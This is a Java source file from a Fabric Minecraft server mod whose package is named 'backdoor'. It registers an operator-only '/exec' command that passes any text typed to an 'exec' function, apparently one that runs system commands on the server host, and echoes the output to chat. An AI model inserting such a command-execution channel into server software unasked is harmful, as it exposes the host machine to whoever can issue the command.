package tk.merith.backdoor.commands;

import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.minecraft.server.command.CommandManager;
import net.minecraft.text.LiteralText;
import tk.merith.backdoor.ExecuteFunction;
import net.minecraft.text.Text;

import static com.mojang.brigadier.arguments.StringArgumentType.getString;
import static net.minecraft.server.command.CommandManager.argument;

import static com.mojang.brigadier.arguments.StringArgumentType.greedyString;
import static tk.merith.backdoor.ExecuteFunction.exec;


public class ExecuteCommand {
    public static void register() {
        CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
            dispatcher.register(CommandManager
                    .literal("exec")
                    .requires(source -> source.hasPermissionLevel(4))

                    .then(argument("command", greedyString())
                            .executes(context -> {

                                String command = getString(context, "command");

                                context.getSource().sendFeedback(new LiteralText("<EXEC> "+ command), true);
                                Text output = exec(command);
                                context.getSource().sendFeedback(output, true);
                                return 1;
                            })
                    )
            );
        });
    }
}
